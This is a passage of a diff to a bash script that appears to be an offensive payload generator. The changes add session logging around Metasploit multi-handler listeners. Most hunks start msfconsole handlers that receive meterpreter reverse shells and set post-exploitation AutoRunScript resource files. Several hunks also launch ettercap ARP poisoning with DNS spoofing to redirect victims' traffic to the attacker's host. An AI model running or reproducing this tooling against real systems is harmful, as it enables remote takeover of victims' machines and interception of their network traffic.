-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
+
 
    else
 
@@ -1586,7 +1876,22 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -1596,8 +1901,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          fi
         fi
    fi
 
@@ -1681,7 +1999,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -1755,7 +2087,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -1766,8 +2113,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -1888,7 +2248,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -1961,7 +2335,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -1972,8 +2361,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -2103,7 +2505,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -2129,7 +2545,22 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -2140,8 +2571,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -2255,7 +2699,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -2287,7 +2745,22 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -2298,8 +2771,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -2400,7 +2886,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -2472,9 +2972,25 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -2483,8 +2999,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -2562,9 +3091,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
